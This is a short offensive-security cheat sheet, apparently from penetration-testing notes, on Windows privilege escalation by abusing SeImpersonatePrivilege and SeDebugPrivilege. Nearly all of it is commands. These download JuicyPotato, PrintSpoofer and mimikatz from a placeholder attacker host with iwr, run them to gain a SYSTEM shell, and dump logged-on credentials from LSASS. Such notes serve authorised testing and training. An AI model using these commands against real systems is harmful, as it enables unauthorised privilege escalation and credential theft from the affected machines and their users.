# Windows Privilege Abuse

!!! tip "Tip"
    SeImpersonatePrivilege is the most common Windows privesc in HTB and real engagements. Use `PrintSpoofer`, `RoguePotato`, or `GodPotato` depending on Windows version. `whoami /priv` is always the first check.

---

## SeImpersonatePrivilege

### Check for the Privilege

```powershell
whoami /priv | findstr /i "SeImpersonate"
```

### Juicy Potato (Windows < 10 1809 / Server 2019)

```powershell
iwr -uri http://<attacker-ip>/JuicyPotato.exe -OutFile JuicyPotato.exe
JuicyPotato.exe -l 1337 -p cmd.exe -t *
```

### PrintSpoofer (Windows 10 1809+)

```powershell
iwr -uri http://<attacker-ip>/PrintSpoofer.exe -OutFile PrintSpoofer.exe
.\PrintSpoofer.exe -i -c cmd
```

---

## SeDebugPrivilege

### Check for the Privilege

```powershell
whoami /priv | findstr /i "SeDebug"
```

### Dump LSASS Credentials

```powershell
iwr -uri http://<attacker-ip>/mimikatz.exe -OutFile mimikatz.exe
.\mimikatz.exe
```

```mimikatz
privilege::debug
sekurlsa::logonpasswords
```

### Get a SYSTEM Shell via winlogon.exe

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # process::list
mimikatz # process::open winlogon.exe
mimikatz # process::token
mimikatz # process::run
```
